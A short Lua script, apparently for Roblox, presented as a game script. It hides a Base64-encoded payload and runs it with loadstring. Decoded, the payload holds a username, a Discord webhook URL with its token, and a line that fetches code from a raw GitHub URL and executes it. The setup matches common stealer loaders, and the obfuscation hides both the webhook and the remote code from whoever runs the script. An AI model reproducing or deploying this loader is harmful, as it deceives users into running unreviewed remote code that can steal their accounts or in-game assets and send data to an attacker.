
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gIk5PVEJFTlNBTFRBQ0MiCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MTM4ODg0MTc0Mjc2MjA2Ni9seWxtMXU2d25pTXdoV09lWVNma1F4Z3NkeGl6TGJkTVoxWjVMWU9fZGl0OGVSNldmdmM4U2gxV1FZMDlCWmhzOE52dCIKCi0tIFBMU0RPTkFURSBTY3JpcHQKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQUtBamRkYy9OZXctU291cmNlcy9yZWZzL2hlYWRzL21haW4vcGxzLS1kb25hdGUudHh0IiwgdHJ1ZSkpKCkK"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()
